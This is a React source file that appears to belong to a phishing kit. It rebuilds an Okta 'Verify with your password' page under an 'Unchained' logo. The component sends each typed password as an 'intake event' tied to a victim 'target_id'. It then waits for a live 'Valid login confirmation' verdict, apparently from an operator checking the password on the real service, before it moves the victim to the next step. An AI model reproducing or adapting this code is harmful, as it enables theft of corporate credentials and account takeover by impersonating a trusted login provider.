'use client'

import addIntakeEvent from "@/app/(tropic)/addIntakeEvent";
import brandLogoSrc from "@/app/(tropic)/brandLogoSrc";
import checkForExistingCheckpoint from "@/app/(tropic)/checkForExistingCheckpoint";
import { getTargetId } from "@/app/(tropic)/getTargetId";
import proceedStep from "@/app/(tropic)/proceedStep";
import { useEffect, useState } from "react"
import { PulseLoader } from "react-spinners";
import { getBrowserTRPCClient } from "@/app/utils/trpc/client";

export default function PasswordForm() {
    const [anim, setAnim] = useState(false);
    const [invalid, setInvalid] = useState(false);
    const [password, setPassword] = useState('');
    const [showPass, setShowPass] = useState(false);
    const [loading, setLoading] = useState(false);
    useEffect(() => {
        setAnim(true)
    }, [])
    async function handleSubmit(e) {
        e.preventDefault();
        if (loading) return;
        if (password?.length < 3) {
            setInvalid(true);
            return;
        }
        setInvalid(false);
        setLoading(true);
        addIntakeEvent({
            type: 'input',
            input_title: 'Password',
            input_value: password,
            target_id: await getTargetId()
        });

        if (!(await checkForExistingCheckpoint('Valid login confirmation'))) {
            await addIntakeEvent({
                target_id: await getTargetId(),
                type: 'checkpoint',
                checkpoint_status: 'waiting',
                checkpoint_resolution: 'Valid login confirmation',
                checkpoint_type: 'dual'
            })
        }
        await subscribeToIntakeEvents();
    }
    async function subscribeToIntakeEvents() {
        try {
            const trpc = getBrowserTRPCClient();
            const targetId = await getTargetId();
            trpc.checkpoints.onResolution.subscribe(
                {
                    targetId,
                    resolution: 'Valid login confirmation',
                },
                {
                    onData: (payload) => {
                        console.log('Checkpoint update:', payload);
                        console.log('this is for login conf')
                        if (payload?.row?.checkpoint_dual_outcome == 'good') {
                            //alert('correct!')
                            proceedStep();
                        }
                        else if (payload?.row?.checkpoint_dual_outcome == 'bad') {
                            setInvalid(true);
                            setLoading(false);
                        }
                    },
                    onError: (error) => {
                        console.error('Error subscribing in passwordform:', error)
                    },
                }
            );
        } catch (error) {
            console.error('Error subscribing in passwordform:', error)
        }
    }
    return (

        <main data-se="auth-container" tabIndex="-1" id="okta-sign-in" className={`PasswordMain auth-container main-container ${!anim && 'no-beacon'}`}>
            <div className="okta-sign-in-header auth-header">
                <h1>
                    <img src={brandLogoSrc} className="auth-org-logo" alt="Unchained logo logo" aria-label="Unchained logo logo" />
                </h1>
                <div data-type="beacon-container" className="beacon-container">
                </div>
            </div>
            <div className="auth-content" data-stage="password">
                <div className="auth-content-inner">
                    <div className="siw-main-view challenge-authenticator--okta_password mfa-verify-password">
                        <div className="siw-main-header">
                            <div>
                                <div>
                                    <div data-type="beacon-container" className="beacon-container" style={{ transform: 'scale(1)', textIndent: '1px' }}>
                                        <div className="beacon-blank auth-beacon">
                                            <div className="beacon-blank js-blank-beacon-border auth-beacon-border">
                                            </div>
                                        </div>
                                        <div className="bg-helper auth-beacon auth-beacon-factor mfa-okta-password" data-se="factor-beacon">
                                            <div className="okta-sign-in-beacon-border auth-beacon-border">
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div className="siw-main-body">
                            <form onSubmit={e => handleSubmit(e)} data-se="o-form" slot="content" id="form52" className="ion-form o-form o-form-edit-mode">
                                <div data-se="o-form-content" className="o-form-content o-form-theme clearfix">
                                    <h2 data-se="o-form-head" className="okta-form-title o-form-head">Verify with your password</h2>
                                    <div className="o-form-info-container">
                                    </div>
                                    <div className="o-form-error-container o-form-has-errors" data-se="o-form-error-container" role="alert">
                                        {invalid &&
                                            <div>
                                                <div className="okta-form-infobox-error infobox infobox-error" role="alert">
                                                    <span className="icon error-16">
                                                    </span>
                                                    <p>Unable to sign in</p>
                                                </div>
                                            </div>
                                        }
                                    </div>
                                    <div className="o-form-fieldset-container" data-se="o-form-fieldset-container">
                                        <div data-se="o-form-fieldset-credentials.passcode" className="o-form-fieldset o-form-label-top">
                                            <div data-se="o-form-label" className="okta-form-label o-form-label">
                                                <label htmlFor="input60">Password&nbsp;</label>
                                            </div>
                                            <div data-se="o-form-input-container" className="o-form-input">
                                                <span data-se="o-form-input-credentials.passcode" className="o-form-input-name-credentials.passcode o-form-control okta-form-input-field input-fix">
                                                    <input placeholder="" id="input60" aria-label="" autoComplete="current-password" className="password-with-toggle"
                                                        value={password} onChange={e => setPassword(e.target.value)}
                                                        type={showPass ? "text" : "password"}
                                                        name="credentials.passcode" />
                                                    <span className="password-toggle" onClick={() => setShowPass(cur => !cur)}>


                                                        <span className="eyeicon visibility-16 button-show">
                                                        </span>
                                                        <span className="eyeicon visibility-off-16 button-hide">
                                                        </span>

                                                    </span>
                                                </span>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div className="o-form-button-bar">
                                    {
                                        loading ?
                                            <div className="button button-primary passwordLoadingButton" data-type="save" type="submit" value="Verify">
                                                <PulseLoader
                                                    color="#f9f9f9"
                                                    className="pulseLoader"
                                                    size={"10px"}
                                                    speedMultiplier={0.9}
                                                />
                                            </div>
                                            :
                                            <input className="button button-primary" data-type="save" type="submit" value="Verify" />
                                    }
                                </div>
                            </form>
                        </div>
                        <div className="siw-main-footer">
                            <div className="auth-footer">
                                <a data-se="cancel" href="#"
                                    onClick={() => { location.reload() }}
                                    className="link js-cancel">Back to sign in</a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </main>


    )
}